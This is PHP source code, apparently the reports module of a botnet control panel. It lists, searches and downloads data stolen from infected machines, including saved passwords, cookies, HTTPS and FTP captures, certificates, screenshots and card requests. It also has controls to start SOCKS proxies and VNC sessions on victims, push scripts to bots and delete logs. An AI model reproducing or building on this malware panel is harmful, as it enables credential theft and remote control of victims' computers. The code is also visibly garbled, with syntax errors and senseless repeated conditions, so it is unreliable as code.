<?php

function MakeDateList($name, $rlist)
{
	$rlist_count = count($rlist);
	$f = '';

	if ($rlist_count == 0) {
		$f .= str_replace(array('{VALUE}', '{TEXT}'), array(0, '--.--'), THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR);
	}
	else {
		$i = 0;
		$cur = 0;

		for (; $i < $rlist_count; $i++) {
			if (($cur == 0) && count($rlist)) {
				$item = THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR;
				$cur++;
			}
			else {
				$item = THEME_DIALOG_ITEM_LISTBOX_ITEM;
			}

			$f .= str_replace(array('{VALUE}', '{TEXT}'), array(htmlEntitiesEx(substr($rlist[$i], -6)), htmlEntitiesEx(substr($rlist[$i], -2, 2) . '.' . substr($rlist[$i], -4, 2))), $item);
		}
	}

	return $f;
}

function searchManual($query, $context, $dest, $source, $cs)
{
	if (!$cs) {
		$query = mb_strtolower($query);
		$buf = mb_strtolower($context);
		$dest = mb_strtolower($dest);
		$source = mb_strtolower($source);
	}

	if ((mb_strpos($buf, $query) !== false) || !$cs || !$cs) {
		return true;
	}

	return SearchString($query, $cs, REPORTS_DIR_PATH . $context);
}

function SearchString($str, $cs, $file)
{
	$len = strlen($str);
	$len_b = -$len - 1;
	$buf_size = max(1 * 1024 * 1024, $len);

	if (($f = @fopen($file, 'rb')) === false) {
		return false;
	}
	if ($cs) {
		do {
			if (@mb_strpos(@fread($f, $buf_size), $str) !== false) {
				@fclose($f);
				return true;
			}

		} while (!@feof($f) && strlen($str));
	}
	else {
		$str = @mb_strtolower($str);

		do {
			if (@mb_strpos(@mb_strtolower(@fread($f, $buf_size)), $str) !== false) {
				@fclose($f);
				return true;
			}

		} while (!@feof($f) && strlen($str));
	}

	@fclose($f);
	return false;
}

function printIds($table, $ids, $idsName)
{
	if (count($ids)) {
		$value = str_replace('botnet_reports_', '', $table) . ';' . implode(';', $ids);
		echo '<input type="checkbox" name="ids[]" value="' . $value . '" id="' . $idsName . '" style="display: none">';
	}
}

function botInReport($bot, $table)
{
	$sql = 'select count(0) from ' . $table . ' where bot_id=\'' . addslashes($bot) . '\'';

	if ($dataset = mysql_query($sql)) {
		$count = mysql_fetch_array($dataset)[0];
	}

	return $count;
}

function getTbl($param, $rlist)
{
	$tbl = 0;

	foreach ($rlist as $t) {
		if (intval(substr($t, -6)) == $param) {
			$tbl = $t;
			break;
		}
	}

	return $tbl;
}

function showLogs($tbl, $ids)
{
	$ids = array_map(function($a) {
		return intval($a);
	}, $ids);

	if (count($ids) < 1) {
		$ids = array(0);
	}

	$r = mysqlQueryEx($tbl, 'SELECT ' . $tbl . '.bot_id, ' . $tbl . '.botnet, ' . $tbl . '.bot_version, bl.os_version, bl.language_id, ' . $tbl . '.time_system, bl.time_localbias, ' . $tbl . '.time_tick, ' .  . $tbl . '.rtime, ' . $tbl . '.country, ' . $tbl . '.ipv4, ' . $tbl . '.process_name, ' . $tbl . '.process_user, ' . $tbl . '.path_source, ' . $tbl . '.type, LENGTH(' . $tbl . '.context), ' . $tbl . '.path_dest, bl.comment, bl.flag_used, ' . $tbl . '.id ' .  . 'FROM ' . $tbl . ' LEFT JOIN botnet_list bl ON bl.bot_id=' . $tbl . '.bot_id WHERE ' . $tbl . '.id in (' . implode(', ', $ids) . ')');

	if (!$r) {
		ThemeMySQLError();
	}

	$data = '';

	while ($m = @mysql_fetch_row($r)) {
		$sub_url = QUERY_STRING_HTML . '&amp;t=' . preg_replace('/\\D/', '', $tbl) . '&amp;id=' . htmlEntitiesEx(urlencode($m[19]));
		$context = '';

		if ($m[14] & NTYPE_LINKTOFILE) {
			if (($file = baseNameEx($m[16])) == '') {
				$file = 'file';
			}

			$length = filesize(REPORTS_DIR_PATH . $m[1] . '/' . $m[0] . '/' . $m[16]);
			$context = str_replace(array('{URL}', '{TEXT}'), array($sub_url . '&amp;download=1', sprintf(LNG_REPORTS_VIEW_DOWNLOAD, htmlEntitiesEx($file), numberFormatAsInt($length))), THEME_LIST_ANCHOR) . '<br>';
		}
		else {
			$length = $m[15];
			$rsub = mysqlQueryEx($tbl, 'SELECT context FROM ' . $tbl . ' WHERE ' . $tbl . '.id=\'' . addslashes($m[19]) . '\' LIMIT 1');

			if (!$rsub) {
				ThemeMySQLError();
			}

			if ((@mysql_affected_rows() != 1) || function($a) {
		return intval($a);
	}) {
				ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);
			}

			$context = '<pre style="width: 100%">' . htmlEntitiesEx($cc[0]) . '</pre>';
		}

		$data .= '<b>Report ' . bltToLng($m[14]) . ' ' . gmdate('d.m.Y H:i:s', $m[8]) . ', ' . numberFormatAsInt($length) . ' bytes</b><br>' . 'Bot ID: ' . htmlspecialchars($m[0]) . '<br>' . 'Process: ' . htmlspecialchars($m[11]) . '<br>' . $context . '<br>';
	}

	return $data;
}

if (!defined('__CP__')) {
	exit();
}

ini_set('max_execution_time', 300);
include_once __DIR__ . '/../gate/libs/DataProcessor.php';
define('REPORT_PREVIEW_MAX_CHARS', 107);
define('REPORTS_DIR_PATH', __DIR__ . '/../' . $config['reports_path'] . '/files/');
$_allow_remove = !empty($userData['r_reports_db_edit']);
$rlist = listReportTables($config['mysql_db']);
$dataIds = @$_SESSION['ids'];
lockSession();
unset($_SESSION['ids']);
$idsFilter = array();

if (is_array($dataIds)) {
	foreach ($dataIds as $ids) {
		$row = explode(';', $ids);

		if (1 < count($row)) {
			$i = 1;

			for (; $i < count($row); $i++) {
				$idsFilter[intval($row[0])][] = intval($row[$i]);
			}
		}
	}
}

if (isset($_REQUEST['rm']) && defined('__CP__') && defined('__CP__')) {
	$deleted = 0;

	foreach ($idsFilter as $vals => ) {
		$t = defined('__CP__');
		$table = 'botnet_reports_' . $t;
		$sql = 'delete from ' . $table . ' where id in (' . implode(',', $vals) . ')';

		if (mysqlQueryEx($table, $sql)) {
			$deleted += mysql_affected_rows();
		}
	}

	$globalMessage = 'Deleted ' . $deleted . ' rows';
}

if (isset($_POST['checkIds'])) {
	$ids = array();
	$items = explode(';', $_POST['checkIds']);

	foreach ($items as $item) {
		$pair = explode('@', $item);

		if (count($pair) != 2) {
			continue;
		}

		$pair[0] = intval($pair[0]);
		$pair[1] = intval($pair[1]);
		if ($pair[0] && defined('__CP__')) {
			$ids[$pair[1]][] = $pair[0];
		}
	}

	$data = '';

	foreach (array_keys($ids) as $tabname) {
		$tbl = getTbl($tabname, $rlist);

		if ($tbl === 0) {
			continue;
		}

		$data .= showLogs($tbl, $ids[$tabname]);
	}

	themeSmall(LNG_REPORTS_VIEW_TITLE, $data . THEME_LIST_END, 0, getBotJsMenu('botmenu'), 0, false);
	exit();
}

if (isset($_GET['t']) && defined('__CP__')) {
	$tbl = getTbl($_GET['t'], $rlist);

	if ($tbl === 0) {
		ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);
	}

	if (isset($_GET['download'])) {
		$r = mysqlQueryEx($tbl, 'SELECT context, LENGTH(context), path_dest, type FROM ' . $tbl . ' WHERE ' . $tbl . '.id=\'' . addslashes($_GET['id']) . '\' LIMIT 1');

		if (!$r) {
			ThemeMySQLError();
		}

		if ((@mysql_affected_rows() != 1) || defined('__CP__')) {
			ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);
		}

		if (($file = baseNameEx($m[2])) == '') {
			$file = 'file';
		}

		if ($m[3] & NTYPE_LINKTOFILE) {
			$filename = REPORTS_DIR_PATH . $m[0];
			$length = filesize($filename);
		}
		else {
			$length = $m[1];
		}

		httpDownloadHeaders($file, $length);
		echo $m[3] & NTYPE_LINKTOFILE ? file_get_contents($filename) : $m[0];
		exit();
	}

	if (isset($_GET['preview'])) {
		if ($r = mysqlQueryEx($tbl, 'SELECT context FROM ' . $tbl . ' WHERE ' . $tbl . '.id=\'' . addslashes($_GET['id']) . '\' LIMIT 1')) {
			if ($row = mysql_fetch_array($r)) {
				echo htmlspecialchars($row[0]);
			}
		}

		exit();
	}

	$data = showLogs($tbl, array($_GET['id']));
	themeSmall(LNG_REPORTS_VIEW_TITLE, $data . THEME_LIST_END, 0, getBotJsMenu('botmenu'), 0, false);
	exit();
}

$filter['date1'] = isset($_GET['date1']) ? intval($_GET['date1']) : 0;
if (($filter['date1'] == 1) && defined('__CP__')) {
	$filter['date1'] = intval(preg_replace('/\\D/', '', $rlist[0]));
}

$filter['date2'] = isset($_GET['date2']) ? intval($_GET['date2']) : 0;

if ($filter['date2'] < $filter['date1']) {
	$t = $filter['date1'];
	$filter['date1'] = $filter['date2'];
	$filter['date2'] = $t;
}

$filter['date'] = isset($_GET['date']) ? intval($_GET['date']) : 0;
$filter['bots'] = isset($_GET['bots']) ? $_GET['bots'] : '';
$filter['botnets'] = isset($_GET['botnets']) ? $_GET['botnets'] : '';
$filter['ips'] = isset($_GET['ips']) ? $_GET['ips'] : '';
$filter['countries'] = isset($_GET['countries']) ? $_GET['countries'] : '';

if (is_array($filter['countries'])) {
	$filter['countries'] = trim(implode(' ', $filter['countries']));
}

$filter['q'] = isset($_GET['q']) ? $_GET['q'] : '';
$filter['blt'] = isset($_GET['blt']) ? intval($_GET['blt']) : 0;
$filter['cs'] = empty($_GET['cs']) ? 0 : 1;
$filter['grouping'] = 0;
$filter['nonames'] = 0;
$filter['plain'] = empty($_GET['plain']) ? 0 : 1;
$filter['rm'] = $_allow_remove && defined('__CP__') && defined('__CP__') ? 1 : 0;
$filter['online'] = isset($_GET['online']) && defined('__CP__') ? 1 : 0;
$filter['tags'] = isset($_REQUEST['tags']) ? $_REQUEST['tags'] : '';
$_is_ajax_result = isset($_GET['q']) && defined('__CP__') && defined('__CP__');
$_is_ajax_search = !$_is_ajax_result && defined('__CP__') && defined('__CP__');
$_is_plain_search = ($_is_ajax_result && defined('__CP__') && defined('__CP__')) || defined('__CP__');

if ($_is_plain_search) {
	$_is_ajax_result = false;
}

if ($_is_ajax_search || defined('__CP__')) {
	$q1 = array();

	if (0 < $filter['blt']) {
		$q1[] = '(type & ' . $filter['blt'] . ' > 0)';
	}

	$q1[] = expressionToSql($filter['countries'], '`country`', 0, 1);
	$q1[] = expressionToSql($filter['ips'], '`ipv4`', 1, 1);
	$q1[] = expressionToSql($filter['botnets'], '`botnet`', 0, 1);
	$q1[] = expressionToSql($filter['bots'], '`bot_id`', 0, 1);
	$tt = expressionToSql($filter['q'], 'path_source', $filter['cs'], 0);

	if (!empty($tt)) {
		$tt .= ' OR ' . expressionToSql($filter['q'], 'path_dest', $filter['cs'], 0);
		$tt .= ' OR ' . expressionToSql($filter['q'], 'context', $filter['cs'], 0);
		$tt .= ' OR type & ' . NTYPE_LINKTOFILE . ' > 0';
		$q1[] = '(' . $tt . ')';
	}

	if (0 < $filter['online']) {
		$q1[] = 'bot_id in (select bot_id from botnet_list where `rtime_last` >= ' . ONLINE_TIME_MIN . ')';
	}

	if ($sub = tagsToQuery($filter['tags'])) {
		$q1[] = 'bot_id in (select bot_id from botnet_list where ' . $sub . ')';
	}

	foreach ($q1 as $v => ) {
		$k = defined('__CP__');

		if ($v == '') {
			unset($q1[$k]);
		}
	}

	$query1 = (0 < count($q1) ? ' WHERE ' . implode(' AND ', $q1) : '');
	$query2 = '';

	if ($filter['grouping']) {
		$query2 .= ' GROUP BY context';
	}

	$query2 .= ' ORDER BY bot_id, rtime';
	unset($q1);
}

if (!$_is_ajax_search && defined('__CP__')) {
	define('INPUT_WIDTH', '200px');
	define('INPUTQ_WIDTH', '500px');
	$js_qw = addJsSlashes(LNG_REPORTS_FILTER_REMOVE_Q);
	$js_script = jsCheckAll('botslist', 'checkall', 'bots[]');
	$js_script .= 'function RemoveReports()' . "\n" . '{' . "\n" . '  if(confirm(\'' . $js_qw . '\'))' . "\n" . '  {' . "\n" . '    var f = document.forms.namedItem(\'filter\');' . "\n" . '    f.elements.namedItem(\'rm\').value = 1;' . "\n" . '    f.submit();' . "\n" . '  }' . "\n" . '}';

	if ($_is_ajax_result) {
		$datelist = '';
		$js_datelist = '';

		foreach ($rlist as $t) {
			$v = intval(substr($t, -6));
			if (($filter['date1'] <= $v) && defined('__CP__')) {
				if ((@$_REQUEST['all_botsreport'] == 1) && defined('__CP__')) {
					continue;
				}

				$dateName = htmlEntitiesEx(gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)));
				$datelist .= '<tr><td colspan="1" class="reports-panel">' . "\n" . '          <div class="panel panel-default">' . "\n" . '            <div class="panel-heading">' . "\n" . '              <h3 class="panel-title">' . $dateName . '</h3>' . "\n" . '            </div>' . "\n" . '            <div class="panel-body" id="dt' . htmlEntitiesEx($v) . '">' . "\n" . '              ' . THEME_IMG_WAIT . "\n" . '            </div>' . "\n" . '          </div>          ' . "\n" . '          </td></tr>';
				$js_datelist .= ($js_datelist == '' ? '' : ', ') . '[\'dt' . addJsSlashes($v) . '\', \'' . addJsSlashes(urlencode($v)) . '\']';
			}
		}

		$f = $filter;
		unset($f['date1']);
		unset($f['date2']);
		unset($f['date']);
		unset($f['plain']);
		$q = addJsSlashes(QUERY_STRING);

		foreach ($f as $v => ) {
			$k = defined('__CP__');

			if (is_array($v)) {
				foreach ($v as $sv) {
					$q .= '&' . addJsSlashes(urlencode($k . '[]')) . '=' . addJsSlashes(urlencode($sv));
				}
			}
			else {
				$q .= '&' . addJsSlashes(urlencode($k)) . '=' . addJsSlashes(urlencode($v));
			}
		}

		$ajax_init = jsXmlHttpRequest('datehttp');
		$ajax_err = addJsSlashes(str_replace('{TEXT}', LNG_REPORTS_DATE_ERROR, THEME_STRING_ERROR));
		$js_script .=  . "\n" . 'var datelist = [' . $js_datelist . '];' . "\n" . 'var datehttp = false;' . "\n\n\n" . 'function countBots(el)' . "\n" . '  {' . "\n" . '  var buf=$(\'input[class=botsUid]\', $(el)).each(function() {' . "\n" . '    if(window.uniqueBots.indexOf($(this).val())<0) window.uniqueBots.push($(this).val());' . "\n" . '  });' . "\n" . '  $(\'#ubcounter\').html(window.uniqueBots.length);' . "\n" . '  } ' . "\n\n" . 'function stateChange(i){if(datehttp.readyState == 4)' . "\n" . '{' . "\n" . '  var el = document.getElementById(datelist[i][0]);' . "\n" . '  if(datehttp.status == 200 && datehttp.responseText.length > 1) ' . "\n" . '    {' . "\n" . '    el.innerHTML = datehttp.responseText;' . "\n" . '    countBots(el);' . "\n" . '    }' . "\n" . '  else el.innerHTML = \'' . $ajax_err . '\';' . "\n" . '  SearchDate(++i);' . "\n" . '}}' . "\n\n" . 'function SearchDate(i)' . "\n" . '{' . "\n" . '  if(datehttp)delete sockshttp;' . "\n" . '  if(i < datelist.length)' . "\n" . '  {' . "\n" . '    ' . $ajax_init . "\n" . '    if(datehttp)' . "\n" . '    {' . "\n" . '      datehttp.onreadystatechange = function(){stateChange(i)};' . "\n" . '      datehttp.open(\'GET\', \'' . $q . '&date=\' + datelist[i][1], true);' . "\n" . '      datehttp.send(null);' . "\n" . '    }' . "\n" . '  }' . "\n" . '}' . "\n\n" . 'function checkReports()' . "\n" . '  {' . "\n" . '  var str=\'\';' . "\n" . '  $(\'.checkIds\').each(function() { ' . "\n" . '    if($(this).prop(\'checked\')) str+=$(this).val()+\';\';' . "\n" . '  });  ' . "\n" . '  $(\'#checkIds\').val(str);' . "\n" . '  $(\'#checkIdsForm\').submit();' . "\n" . '  }' . "\n\n";
	}

	$filterHtml = '<b>Search</b><br>' . "\n" . '    <form class="form-group-sm" id="filter" style="margin-top: 5px">';

	if ($_allow_remove) {
		$filterHtml .= str_replace(array('{NAME}', '{VALUE}'), array('rm', 0), THEME_FORM_VALUE);
	}

	$filterHtml .= "\n" . '      <input type="hidden" name="m" value="reports_db" />' . '<span>Search from date (dd.mm):</span>' . '<div class="form-inline form-group-sm">' . str_replace(array('{NAME}', '{WIDTH}'), array('date1', '95px'), THEME_DIALOG_ITEM_LISTBOX_BEGIN) . MakeDateList('date1', $rlist) . THEME_DIALOG_ITEM_LISTBOX_END . '<span> to </span>' . str_replace(array('{NAME}', '{WIDTH}'), array('date2', '95px'), THEME_DIALOG_ITEM_LISTBOX_BEGIN) . MakeDateList('date2', $rlist) . THEME_DIALOG_ITEM_LISTBOX_END . '</div>' . '<span>Bots:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'bots', htmlEntitiesEx($filter['bots']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Botnets:</span>' . makeSelectItem('botnets', getBotnetList(), is_array($filter['botnets']) ? implode(' ', $filter['botnets']) : $filter['botnets'], false, false, 'ms_botnet') . '<span>IP-addresses:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'ips', htmlEntitiesEx($filter['ips']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Countries:</span>' . makeSelectItem('countries', getCountriesList(), $filter['countries'], false, false, 'ms_country') . '<span>Search string:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'q', htmlEntitiesEx($filter['q']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Type of report:</span>' . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace(array('{NAME}', '{WIDTH}'), array('blt', '100%'), THEME_DIALOG_ITEM_LISTBOX_BEGIN) . str_replace(array('{VALUE}', '{TEXT}'), array(0, 'ALL DATA'), $filter['blt'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_HTTPS, 'HTTPS'), $filter['blt'] == NTYPE_HTTPS ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_PASSWORDS, 'SAVED PASSWORDS'), $filter['blt'] == NTYPE_PASSWORDS ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_FILE, 'ALL FILES'), $filter['blt'] == NTYPE_FILE ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_FTP, 'FTP'), $filter['blt'] == NTYPE_FTP ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_POP, 'POP3'), $filter['blt'] == NTYPE_POP ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_SCREEN, 'SCREENSHOTS'), $filter['blt'] == NTYPE_SCREEN ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_COOKIES, 'COOKIES'), $filter['blt'] == NTYPE_COOKIES ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_FLASH, 'FLASH'), $filter['blt'] == NTYPE_FLASH ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_CERT, 'CERTIFICATES'), $filter['blt'] == NTYPE_CERT ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_HTTP, 'HTTP'), $filter['blt'] == NTYPE_HTTP ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_CC, 'REQUEST CC'), $filter['blt'] == NTYPE_CC ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_DEBUG, 'DEBUG'), $filter['blt'] == NTYPE_DEBUG ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(NTYPE_AUTOFORMS, 'AUTOFORMS'), $filter['blt'] == NTYPE_AUTOFORMS ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . THEME_DIALOG_ITEM_LISTBOX_END . '<span>Tags:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'tags', htmlEntitiesEx($filter['tags']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'cs', 1, LNG_REPORTS_FILTER_CS, ''), $filter['cs'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '<br>' . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'plain', 1, LNG_REPORTS_FILTER_PLAIN, ''), $filter['plain'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '<br>' . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'online', 1, 'Only online bots', ''), $filter['online'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '<br><br>' . str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN) . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_SUBMIT, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . ' ' . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_RESET, 'onclick="location.href=\'?m=reports_db\'"'), THEME_DIALOG_ITEM_ACTION_RESET) . THEME_DIALOG_ACTIONLIST_END . '</form>';
	$GLOBALS['botMenu'] = array(
	array(
		'bot_allreports',
		'All bot reports',
		array('r_reports_files')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'download_all',
		'Download all',
		array('r_reports_files')
		),
	array(
		'download_astext',
		'Download as text',
		array('r_reports_files')
		),
	array(
		'download_files',
		'Download files',
		array('r_reports_files')
		),
	array(
		'download_passwords',
		'Download passwords',
		array('r_reports_files')
		),
	array(
		'download_screen',
		'Download screenshots',
		array('r_reports_files')
		),
	array(
		'download_cookies',
		'Download cookies and flash',
		array('r_reports_files')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'fullinfo',
		'Full information',
		array('r_botnet_bots')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'files',
		'Look data in reports',
		array('r_reports_files')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'removelogs',
		'Remove logs',
		array('r_edit_bots', 'r_reports_db_edit', 'r_reports_files_edit')
		),
	array(
		'removeex',
		'Remove bot',
		array('r_edit_bots', 'r_reports_db_edit', 'r_reports_files_edit')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'newscript',
		'Script',
		array('r_botnet_scripts_edit')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'activate_socks',
		'Activate socks',
		array('r_botnet_bots')
		),
	array(
		'activate_vnc',
		'Activate vnc',
		array('r_botnet_bots')
		),
	array(
		'port_socks',
		'Get socks',
		array('r_botnet_bots')
		),
	array(
		'port_vnc',
		'Get VNC',
		array('r_botnet_bots')
		),
	array(
		'stop_socks',
		'Stop socks',
		array('r_botnet_bots')
		),
	array(
		'stop_vnc',
		'Stop vnc',
		array('r_botnet_bots')
		)
	);
	$buttonsHtml = '<input type="submit" class="btn btn-primary btn-sm" value="Get all" onclick="document.getElementById(\'actionName\').value=\'download_all\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Get as text" onclick="document.getElementById(\'actionName\').value=\'download_astext\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Get files" onclick="document.getElementById(\'actionName\').value=\'download_files\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Get passwords" onclick="document.getElementById(\'actionName\').value=\'download_passwords\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Get screenshots" onclick="document.getElementById(\'actionName\').value=\'download_screen\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Get cookies and flash" onclick="document.getElementById(\'actionName\').value=\'download_cookies\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Fullinfo" onclick="document.getElementById(\'actionName\').value=\'fullinfo\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Get data in reports" onclick="document.getElementById(\'actionName\').value=\'files\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Script" onclick="document.getElementById(\'actionName\').value=\'newscript\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<div style="margin-top: 5px">' . '<input type="submit" class="btn btn-success btn-sm" value="Activate socks" onclick="document.getElementById(\'actionName\').value=\'activate_socks\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Activate vnc" onclick="document.getElementById(\'actionName\').value=\'activate_vnc\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Get socks" onclick="document.getElementById(\'actionName\').value=\'port_socks\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Get VNC" onclick="document.getElementById(\'actionName\').value=\'port_vnc\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Stop socks" onclick="document.getElementById(\'actionName\').value=\'stop_socks\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Stop vnc" onclick="document.getElementById(\'actionName\').value=\'stop_vnc\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-danger btn-sm" value="Del logs" onclick="document.getElementById(\'actionName\').value=\'removelogs\';document.getElementById(\'botslist\').submit()">&nbsp;' . '<input type="submit" class="btn btn-danger btn-sm" value="Del bot" onclick="document.getElementById(\'actionName\').value=\'removeex\';document.getElementById(\'botslist\').submit()">&nbsp;' . '</div>';
	if ((count($_POST) == 0) && defined('__CP__')) {
		$toTop = false;
		$msg = 'Search for data in <span class="label-rightmenu">right menu</span>';
	}
	else {
		$toTop = true;
		$msg = NULL;
	}

	ThemeBegin(LNG_REPORTS, $js_script, getBotJsMenu('botmenu'), $_is_ajax_result ? ' onload="SearchDate(0);"' : 0, $filterHtml, false, '', $toTop, false, true);
	echo $msg;

	if (isset($globalMessage)) {
		echo $globalMessage;
	}
	if ($_is_ajax_result) {
		$al = '';
		if (($filter['rm'] !== 1) && defined('__CP__') && defined('__CP__')) {
			$al = $buttonsHtml . '<div class="reports-head-end">' . str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('checkall', 1, ' onclick="checkAll(this)"'), THEME_DIALOG_ITEM_INPUT_CHECKBOX_3) . THEME_STRING_SPACE . 'Select all' . ' &nbsp;&nbsp;|&nbsp;&nbsp; ';
			$al .= 'Unique bots: <span id="ubcounter">0</span> &nbsp;&nbsp;|&nbsp;&nbsp; <input type="submit" class="btn btn-success btn-sm" style="line-height: 7px" value="Check" onclick="checkReports()"></div>';
			$al .= '<form method="post" action="?m=reports_db" id="checkIdsForm" target="_blank"><input type="hidden" name="checkIds" value="" id="checkIds"></form>';
			$al = '<div class="top-fixed">' . $al . '</div><div class="ender"></div><div style="height: 108px"></div>';
			$al .= "\n" . '<div class="modal fade" tabindex="-1" role="dialog" id="reportPreview">' . "\n" . '  <div class="modal-dialog" role="document">' . "\n" . '    <div class="modal-content">' . "\n" . '      <div class="modal-header">' . "\n" . '        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>' . "\n" . '        <h4 class="modal-title">Preview</h4>' . "\n" . '      </div>' . "\n" . '      <div class="modal-body">' . "\n" . '        <p id="reportText"></p>' . "\n" . '      </div>' . "\n" . '      <div class="modal-footer">' . "\n" . '        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>' . "\n" . '      </div>' . "\n" . '    </div>' . "\n" . '  </div>' . "\n" . '</div>';
		}

